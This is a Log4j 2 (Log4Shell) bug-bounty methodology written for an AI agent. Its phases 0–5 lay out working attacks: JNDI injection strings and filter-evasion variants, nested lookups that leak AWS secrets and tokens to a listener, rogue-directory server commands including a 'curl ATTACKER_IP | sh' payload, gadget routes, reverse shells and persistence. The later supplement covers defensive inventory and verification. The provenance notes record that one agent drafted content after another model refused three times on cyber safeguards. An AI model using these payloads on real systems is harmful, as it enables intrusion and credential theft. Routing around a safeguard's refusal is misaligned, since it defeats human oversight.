---
technology: "Apache Log4j 2"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.2
last-refresh: "2026-11-19"
family: java
status: thin
evidence: "2 writeups (see ../internal coverage ledger) — thin unit, upstream-weighted by design"
provenance: "corpus-mined from 2 writeups in the writeup corpus + upstream-verified: Apache Logging Services security page (version ranges, mitigation semantics), Log4j 2.15.0/2.16.0 release notes (lookup default changes), rogue-jndi / JNDI-Exploit-Kit usage verified against the tools' own READMEs. Pass 2 wave C, 2026-11-12. Supplement 2026-11-19: log4j2-on-todays-targets (inventory, lookup-context matrix, verification ladder) — drafted by Hermes agent after claude-opus-4-8 [cyber] refusal x3; see supplement provenance line. Phase 5 additions: rewritten from HackTricks (hacktricks/src/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell.md), CC BY-NC 4.0, accessed 2026-11-13 — RMI-vs-LDAP trustURLCodebase version dates verified against the 2021 oss-sec maintainer thread (HT conflates the two: LDAP codebase died at 6u211/7u201/8u191/11.0.1, not the 2017 RMI dates), marshalsec LDAPRefServer syntax verified against its README, scanner/generator repos verified via the GitHub API (feihong-cs/JNDIExploit confirmed removed). HT's Graylog sessions-API example and 2.15 localhost-bypass syntax not carried (not independently verified within fetch budget); HT lab/CTF-box links not carried per vault rules."
---

Companion page: [[log4j|Log4j overview]] — lookup mechanics, affected-version table, where Log4j lives. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Log4j Bug Bounty Methodology

Goal: prove (or rule out) Log4Shell-class code execution on a Java target without crashing it, then weaponize and escalate. Every phase is ordered so a non-destructive signal precedes an intrusive action.

## Phase 0 — Decide it's a Java target

Signals: `Server:` headers of Java stacks (Jetty, Tomcat/Coyote), `JSESSIONID` cookies, `.jsp`/`.do`/`.faces` endpoints, `X-Powered-By: Servlet`, stack traces showing `java.lang.*`, fat `.jar` downloads, fat clients. Any Java process that logs input qualifies — including non-HTTP (FTP greeting logged by a Java gateway, SMTP headers, game protocol chat, WebSocket frames). If the product name is known, check its advisory history for 2021–2022 log4j patches; appliances had long tails.

## Phase 1 — Canary-first detection (detection-safe probing)

**Never lead with a weaponized payload.** A callback to a listener you control proves the vulnerable code path with zero target impact and zero dependence on a working exploit chain.

1. Start an interaction detector: an LDAP listener (`nc -lvnp 1389` shows the raw bind attempt), a DNS canary domain (interactsh-style, or your own wildcard + `tcpdump`/authoritative server logs), or a Burp Collaborator-style notifier.
2. Send the minimal probe into every input you can find, ONE field at a time:

   ```
   ${jndi:ldap://canary.example.com/p1}          # unique path p1 per location
   ${jndi:rmi://canary.example.com/p2}           # protocol variant
   ${jndi:dns://canary.example.com/p3}           # DNS-only, lightest touch
   ```

   Injection points, in rough yield order: login username fields, any free-text form field, HTTP headers (User-Agent, Referer, X-Forwarded-For, custom API headers), URI path and query parameters, JSON/YAML/XML values, SOAP fields, FTP `USER`/greeting, mail Subject/From, chat/game protocol messages, uploaded filenames, error-producing garbage that lands in an exception message.
3. **A callback = the code path is vulnerable.** No callback does NOT mean safe (WAF stripping, log level off, async queue) — retry with obfuscation before ruling out:

   ```
   ${${lower:j}ndi:ldap://canary.example.com/p4}
   ${${::-j}${::-n}${::-d}${::-i}:ldap://canary.example.com/p5}
   ${j${env:barf:-n}di:ldap://canary.example.com/p6}
   ```

   These defeat naive `${jndi` string filters because the outer lookup resolves to the inner text at parse time.
4. **Nested-lookup exfiltration — cred leakage without RCE.** Variables can be nested inside the URL the target will connect back on, so the callback itself carries the secret:

   ```
   ${jndi:ldap://canary.example.com/u=${env:AWS_SECRET_ACCESS_KEY}}
   ${jndi:ldap://canary.example.com/h=${sys:user.name}}
   ```

   Read the value out of your listener's log line (the requested DN/path). This works even when code execution is blocked, and on fields that never echo. Real usage harvested FTP credentials this way before any shell existed. Iterate over high-value env keys (`AWS_*`, `*_PASSWORD`, `*_TOKEN`, `JAVA_HOME` reveals version info too).
5. Version discrimination via behavior: `${jndi:ldap://...}` resolving (callback with a real bind attempt) on a modern-JDK target still proves substitution; `${java:version}` in a field that is ECHOED back (not just logged) leaks the runtime directly.

## Phase 2 — Version and JDK gating (before weaponizing)

1. **Find log4j-core's version**: with any file read / LFI / source disclosure, pull `META-INF/MANIFEST.MF` or the jar listing — `/WEB-INF/lib/log4j-core-*.jar` (version in the filename), or inside shaded bundles (`app.jar!BOOT-INF/lib/`). `pom.xml`, build files, `/actuator/configprops`-style leaks, and error stack frames (`org.apache.logging.log4j.core...` present at all) also answer it. Apply the affected table from the overview page: `[2.0-beta9..2.3.1) ∪ [2.4..2.12.2) ∪ [2.13.0..2.15.0)` = 44228-vulnerable; 2.15.0 still carries 45046/45105; ≤2.17.0 carries 44832 (needs config write).
2. **Find the JDK version**: `java:version` lookup if echoed; `JAVA_HOME` env via nested exfil; `java -version` strings in logs, banners, or `/proc/<pid>/environ` post-foothold. JDK ≥ 8u191 / 11.0.1 blocks remote codebases → plan gadgets, not codebase URLs.
3. Check mitigation flags if you can read the environment/process: `log4j2.formatMsgNoLookups=true` (only meaningful on 2.10–2.14), `-Dlog4j2.noFormatMsgLookup`, patched jars (`JndiLookup` class removed).

## Phase 3 — Weaponize (rogue directory server)

Run a malicious LDAP/RMI endpoint that answers the JNDI fetch. Standard tooling (Appendix A): rogue-jndi and JNDI-Exploit-Kit both serve reference + serialized-object routes and take the command inline:

```
# JNDI-Exploit-Kit style (attacker box; JDK 8 runtime recommended for the server itself):
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar        # interactive: pick LDAP host:port
# served routes (tool prints them), e.g.:
#   ldap://ATTACKER_IP:1389/serial/CommonsCollections5/exec_unix/<base64-cmd>
#   ldap://ATTACKER_IP:1389/serial/CommonsCollections5/exec_global/<base64-cmd>

# rogue-jndi style:
java -jar RogueJndi-1.1.jar --command "curl http://ATTACKER_IP:8081/x | sh" --hostname ATTACKER_IP
```

- Deliver the probe pointing at the route: field = `${jndi:ldap://ATTACKER_IP:1389/serial/CommonsCollections5/exec_unix/<base64>}`.
- **Old JDK**: the `Reference` route (remote codebase) — serve a compiled class via the tool's HTTP stage. **Modern JDK**: the `/serial/` route — LDAP returns a serialized Java object; success depends on a gadget on the target classpath (CommonsCollections variants, etc.). Try several gadget names; each miss is a cheap failed cast.
- Windows targets: stage a payload binary over the tool's HTTP listener (powershell download-and-exec in `--command`); Unix targets: `exec_unix` base64 shell one-liners, reverse shells to a listener.
- If no gadget and old JDK unavailable, fall back to Phase 1's nested exfil as the reportable impact (credential disclosure via log injection is a finding).

## Phase 4 — Post-exploitation

- First moves as the service user: `env`, config files near the app, the log configuration itself (`log4j2.properties` / XML — it names appenders, syslog targets, and often credentials).
- The Java process's privileges are the ceiling: check what account runs it before hunting further.
- **Log hygiene**: your probes are in the target's logs — payloads that recursively log can DoS (45105-class); avoid `${${${...` stacks against production.
- Persist only where authorized; the injected string may also be re-logged by downstream systems (SIEM ingestion), producing second-order callbacks — enumerate what ELSE called back; it maps the target's log pipeline.

## Phase 5 — Tooling, delivery, and JDK-gate refinements (upstream additions, 2026-11-13)

**JDK codebase gates are two-step, not one**: remote-codebase loading over **RMI** was
disabled by default at 6u141/7u131/8u121 (`com.sun.jndi.rmi.object.trustURLCodebase=false`),
but **LDAP** codebase loading stayed permitted until 6u211/7u201/**8u191**/11.0.1
(`com.sun.jndi.ldap.object.trustURLCodebase=false`) — verified against the 2021
oss-sec maintainer thread and vendor writeups. Practical consequence for Phase 1: on a
JDK between 8u121 and 8u190 the `rmi://` probe's codebase route is already dead while
`ldap://` still delivers remote classes — a free JDK-era discriminator. (The reference
this section was rewritten from quotes the 2017 RMI dates for LDAP — a conflation;
Phase 2's 8u191/11.0.1 LDAP gate above is the correct one.) Serialized-object/gadget
routes are unaffected by either flag.

**marshalsec as the codebase server** (syntax verified against its README):
`java -cp marshalsec-*-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit" [port]`
stands up the LDAP referral service; serve a compiled `Exploit.class` whose static block
runs your command (compiled for the target's Java era) from a plain HTTP server
(`python3 -m http.server`) in the same directory. Old-JDK route only — on 8u191+ fall
back to the serialized-gadget routes.

**JNDIExploit (feihong-cs)** — the tool that templated routes like
`Basic/Command/Base64/<b64>` and `Basic/ReverseShell/<ip>/<port>` behind one LDAP
listener — was pulled by its author after disclosure (its GitHub repo is gone; only
web.archive copies of the v1.2 release remain). If an engagement legitimately needs it,
treat any recovered JAR as untrusted code and audit it first, or use a maintained
generator instead: JNDI-Injection-Exploit-Plus (repo verified live) starts the RMI/LDAP/
HTTP trio and emits ready-made JNDI URLs; ysoserial (e.g. CommonsCollections gadget
payloads) supplies custom serialized objects for the modern-JDK route.

**Local (on-host) discovery**: `find / -name 'log4j-core*.jar' 2>/dev/null` locates
candidate jars — read the version from the filename or the jar's manifest and apply the
overview's affected table; remember shaded/fat jars hide it one level deeper. Two
purpose-built scanners automate that sweep: log4j-sniffer (palantir) and the logpresso
CVE-2021-44228-Scanner (which also reports and can apply the mitigation). Network-side
automation: log4j-scan (fullhunt) and the CISA log4j-scanner drive callback-based probes
across URL lists; silentsignal's burp-log4shell does it from Burp.

**More filter-evasion forms** for Phase 1 step 3 (default-value lookups and Unicode):
`${${env:BARFOO:-j}ndi:ldap://canary.example.com/...}` (the `:-` default emits the
literal when the var is unset) and `${${lower:${upper:ı}}...}` — the dotless-i
(U+0131) lowercases to a plain `i`, defeating filters that normalize ASCII case only.

**Layout-pattern oracles (configuration-write precondition)**: where you can influence
the PatternLayout itself (config-file write, or a feature that sets patterns), the
`%replace{...}{regex}{substitution}` conversion pattern enables regex-conditioned
exceptions and regex-amplification timing oracles over unresolved lookups — the Google
CTF 2022 log4j challenges demonstrated flag recovery this way. Gated hard: useless
without pattern control; do not report as reachable from message injection alone.

## Decision points

| Situation | Action |
|---|---|
| Canary fires, no code exec (modern JDK, no gadget) | nested-lookup exfil for secrets; report as log-injection cred disclosure |
| No canary, Java confirmed | obfuscation retries across headers/URI/protocol fields; try non-HTTP inputs; verify with a second interaction channel |
| log4j-core ≥2.17.1 found | rule out 44228-family; check Log4j 1.x presence for CVE-2021-4104 instead |
| Field is echoed, not just logged | still log-only probes; echoed `${java:version}` gives free fingerprinting |
| WAF blocks `${` | nested `${${lower:j}ndi:...}`, URL-encoded delivery, header fields WAFs under-inspect |

## Appendix A — Tools (prose)

- **rogue-jndi** (veracode-research): minimal malicious LDAP/RMI server, `--command`/`--hostname` flags, serves remote-reference payloads for older JDKs.
- **JNDI-Exploit-Kit**: rogue LDAP with templated routes (`serial/<gadget>/exec_unix/<base64>`), prints ready-made `${jndi:...}` strings.
- **marshalsec**: JNDI/serialization gadget generator (`marshalsec.jndi.LDAPRefServer`); also the reference tool when the surface is broader JNDI (e.g. RMI endpoints) rather than log4j.
- **interactsh** / Burp Collaborator: out-of-band canary endpoints for detection and exfil.
- **jd-gui / CFR / jadx**: inspect shaded jars to locate `log4j-core` version during Phase 2 (jadx also for source-level confirmation of the logging call).


## Supplement — log4j2 on TODAY's targets: inventory, lookup contexts, and verification craft (added 2026-11-19)

The phases above assume a reachable application and a suspected sink. This supplement covers the work that comes before and after: finding where log4j2 actually lives in a stack, knowing exactly which lookup contexts evaluate on which versions, and verifying behavior with the least intrusive probe that answers the question. Techniques over CVE archaeology: Log4Shell (CVE-2021-44228, Dec 2021) is the historical anchor — every affected 2.x line is years past end-of-advisory, so the craft is inventory and verification, not payload history.

### S1 — Find where log4j2 actually lives (inventory craft)

Most log4j2 in 2026 is not a top-level dependency — it arrives transitively and gets shaded into fat JARs where SBOMs and `pom.xml` greps never see it. The reliable unit of truth is the bytecode archive:

```bash
# Walk every JAR on the box (or in the container image) and ask the manifest
find / -name '*.jar' 2>/dev/null -exec sh -c '
  v=$(unzip -p "$1" META-INF/MANIFEST.MF 2>/dev/null |
      grep -i "Implementation-Version" | head -1)' _ {} \;

# Stronger: match on the log4j-core class inventory, which survives shading
find / -name '*.jar' 2>/dev/null -print0 |
  xargs -0 -n1 sh -c 'unzip -l "$0" 2>/dev/null | grep -q "org/apache/logging/log4j/core/LogManager.class" && echo "$0"'

# Version from the shaded jar's pom.properties (present in most builds)
unzip -p app.jar BOOT-INF/lib/log4j-core-*.jar 2>/dev/null >/dev/null  # Spring Boot layout hint
```

Decision points:

- **Manifest version vs class-name match disagree** → shaded or repackaged copy; trust the class match, read version from `META-INF/maven/**/pom.properties`.
- **SBOM says no log4j2, class match says yes** → the SBOM gap is itself a finding for the report: dependency convergence (two log4j2 versions resolved to one) and shading both hide copies from artifact-level inventories.
- **`log4j-1.x` instead** → different vulnerability class (SocketAppender chains); do not score it as log4j2.

### S2 — The lookup-context matrix (what evaluates where, per version)

The single most useful mental model for a modern target. A lookup expression (`${...}`) evaluates only in specific contexts, and the 2021 fixes drew hard lines between them:

| Context (where the expression appears) | Example carrier | Evaluates on current 2.17.1+? | Audit consequence |
|---|---|---|---|
| Logged **message text** (attacker-controlled) | request field reaching `logger.info(...)` | **No** — message lookups off by default since 2.16.0 | Pre-2022-style canaries are inert on patched builds; a non-response proves nothing about the version |
| **Pattern layout** (config-controlled) | `%d ${env:DEPLOY_SECRET}` in `log4j2.xml` | Yes | Config-controlled disclosure only — see S3 |
| **Configuration substitution** (config-controlled) | `<Property>\${sys:db.password}</Property>` | Yes | Same: a misconfiguration finding, not a remote one |
| **JNDI in config** (appender refs, 2.15.0+ gates) | `<JMS>` appender endpoint | Heavily gated (2.15.0 restrictions, 2.17.1 JMSAppender fix requires config write access) | Only reachable with config-file write, which is already a critical finding on its own |
| **Message text on legacy <2.16.0** | same as row 1 | Yes | The 2021 class; any copy found in S1 at <2.16.0 is the whole finding |

How to verify a deployment's actual behavior safely (S4 ladder applies): one canary through one suspected ingestion point, read the response/monitoring, stop.

### S3 — Config-context information disclosure (the modern finding class)

On patched log4j2, the realistic finding is **lookups that developers put in their own layouts** and forgot: `${env:}` and `${sys:}` resolve at log time, so any secret reachable as an environment variable or system property and referenced in a pattern layout lands in every log line — and therefore in every log shipper, SIEM, and support-ticket attachment downstream.

```bash
# grep the estate for lookup-bearing layouts (config files, not code)
grep -rnE '\$\{(env|sys|main|date|jndi):' --include='log4j2*.xml' --include='*.properties' /app/configs/
```

Report framing: the finding is "secrets materialized into centralized logging," severity from what the referenced variables hold; remediation is removing the lookup from the layout, not upgrading log4j (it is working as designed).

### S4 — The verification ladder (least-intrusive probe that answers the question)

For each suspected ingestion point: pick the least-intrusive method that can answer a question you have defined, run it once, and stop on sufficient evidence — an inconclusive result is not authorization to escalate. One submission can also be logged or reprocessed multiple times downstream; submission count is not evaluation count:

1. **Monitoring-first**: submit `canary-${env:LOG4J_PROBE}` through the ingestion point and watch the application's OWN log stream (authorized access) for the resolved value. Use a dedicated non-secret variable provisioned in the application's process environment — never reference an existing variable that might hold a secret, or your harmless probe materializes that secret into the logs. A resolved value proves **lookup interpolation somewhere on the observed path** — attribute the evaluating component (log4j-core vs another logger vs a template engine) before naming log4j in the finding. A literal `${...}` result means **no successful substitution was observed — inconclusive**, not proof that no evaluation occurred (log4j leaves the expression intact when a lookup fails). Preserve the exact submitted bytes: your shell, template engine, or HTTP client can expand the expression before it is ever sent.
2. **Authorized out-of-band endpoint**: a canary like `${jndi:ldap://probe.your-domain.example/}` proves **JNDI-in-lookup reachable on that path — nothing more**. Do NOT version-fingerprint from the callback: 2.15.0's fix was incomplete (CVE-2021-45046, non-default Thread Context/Pattern Layout configs stayed exploitable), and backported 2.3.2/2.12.x security lines break the cutoff in both directions. Do NOT infer RCE or assign severity from the callback alone — that comes from corroborated component, version, and configuration evidence. Attribution caveat: the callback source may be a gateway, scanner, or log collector that touched the value, not the app itself — correlate with a unique token per submission, and record the interaction layer separately (DNS query ≠ TCP connection ≠ LDAP request). No callback inside the observation window means "not observed under these conditions," not "not vulnerable." Use your own canary infrastructure (interactsh self-hosted), never a public OAST service, and never against a target outside your authorization.
3. **Response-based tell**: error messages echoing the submitted value verbatim vs transformed — verbatim echo is log injection, not evaluation (see S5).
4. **Timing oracle**: rarely justified — there is no bounded timing model (DNS, retries, buffering, and asynchronous logging all break the lookup-latency relationship); only with separate approval and its own controls.

### S5 — Log injection is not log4j (the distinction that survives triage)

Four observations get conflated into "log4j finding" — keep them separate in every report: **response reflection** (the HTTP response echoes your input — logging never even entered evidence), **literal logging** (the raw string appears in a log — an evaluation may still have been attempted and failed), **log injection** (untrusted input compromises log *structure or interpretation* — a real vulnerability class of its own, requiring evidence of structural impact, not just the string's presence), and **lookup evaluation** (transformation of the string — resolved values or attributable diagnostics, with the component identified per S4.1). Response reflection proves nothing about logging; a literal in a log proves nothing about evaluation; only component-attributed transformation supports a log4j claim. Submitting reflection as evaluation is the classic rejected report.

### S6 — Remediation verification (the follow-up that earns trust)

After the upgrade or layout fix: re-run the SAME canary through the SAME ingestion points (S1 inventory tells you where they all are), confirm literal-or-no evaluation, and attach before/after pairs to the ticket. An upgrade without re-test of every ingestion point from the S1 inventory is not closure — shaded copies survive dependency upgrades by design.

### S7 — Evidence standards

- The S1 class-match command output (paths + versions) — the inventory IS the finding for embedded copies
- For evaluation findings: submitted string, observed output (resolved vs literal), ingestion point, version evidence
- For S3 findings: the layout line, the referenced variable name, and one redacted log line proving materialization
- Never include resolved secret values in the report — the variable *name* and one redacted character range is enough for triage

### Supplement references

- Apache Log4j 2 security page (version ranges, fix semantics): https://logging.apache.org/log4j/2.x/security.html
- Log4j 2 changes report (2.15.0/2.16.0/2.17.0/2.17.1 lookup-context changes): https://logging.apache.org/log4j/2.x/changes-report.html
- Phases 0–5 above (canary-first probing, JDK gating, tooling) remain the reachable-sink methodology

*Supplement corrected 2026-11-19 (v1.2) after external senior review (GPT 6.1 Sol, via owner): callback version-fingerprinting removed (2.15.0 incomplete fix per CVE-2021-45046 + 2.3.2/2.12.x backports, verified against vendor advisories), literal-output inference corrected to inconclusive, attribution and callback-source caveats added, timing rung downgraded, S5 recast as four-way taxonomy. Original supplement note: Drafted by the Hermes agent directly: claude-opus-4-8 refused this topic three times on real-time [cyber] safeguards (research-phase flag, write-phase flag, and a defensive-audit framing with no web access) — a confirmed model block on new log4j content, not a quality signal. Timeline facts (2.15.0 JNDI restrictions, 2.16.0 message-lookup default-off, 2.17.0 recursion fix, 2.17.1 JMSAppender fix) cross-checked against the Apache security and changes pages cited above.*
